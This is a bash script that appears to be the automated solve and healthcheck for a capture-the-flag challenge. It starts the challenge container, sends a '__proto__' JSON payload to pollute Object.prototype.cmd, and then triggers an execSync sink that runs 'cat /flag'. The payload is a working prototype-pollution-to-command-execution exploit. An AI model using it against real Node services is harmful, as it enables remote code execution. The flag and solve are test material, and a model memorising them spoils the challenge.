#!/usr/bin/env bash
# h08 healthcheck / scripted solve: pollute Object.prototype.cmd via /api/preferences,
# then trigger the sink on /api/render (execSync of the inherited option) to run
# `cat /flag`. Confirms the flag is returned.
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FLAG="${CHAL_FLAG-}"; [ -n "$FLAG" ] || FLAG='CYPHER{proto_pollution_to_rce}'
TARGET="${TARGET-}"; CID=""
trap '[ -n "$CID" ] && docker rm -f "$CID" >/dev/null 2>&1 || true' EXIT

if [ -z "$TARGET" ]; then
  docker build -q -t cypher-h08 "$HERE" >/dev/null
  CID="$(docker run -d -e FLAG="$FLAG" -P cypher-h08)"
  PORT="$(docker port "$CID" 8000/tcp | head -1 | sed 's/.*://')"
  TARGET="http://127.0.0.1:$PORT"
fi
for i in $(seq 1 30); do curl -fsS "$TARGET/" >/dev/null 2>&1 && break; sleep 0.5; done

# 1) pollute Object.prototype.cmd on one route
curl -fsS -H 'Content-Type: application/json' \
  --data '{"__proto__":{"cmd":"cat /flag"}}' "$TARGET/api/preferences" >/dev/null
# 2) trigger the sink on a different route
BODY="$(curl -fsS "$TARGET/api/render")"
echo "response: $BODY"
case "$BODY" in *"$FLAG"*) echo "h08 healthcheck rc=0"; exit 0 ;; esac
echo "h08 healthcheck FAILED"; exit 1
